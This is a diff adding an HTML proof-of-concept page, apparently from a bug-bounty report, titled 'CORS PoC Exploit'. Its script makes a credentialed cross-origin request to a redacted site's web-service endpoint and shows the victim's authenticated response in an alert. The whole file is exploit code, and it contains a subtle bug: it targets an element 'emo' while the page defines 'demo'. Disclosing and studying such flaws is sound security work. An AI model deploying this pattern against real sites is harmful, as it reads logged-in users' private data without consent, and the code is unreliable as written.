@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("GET", "https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
+
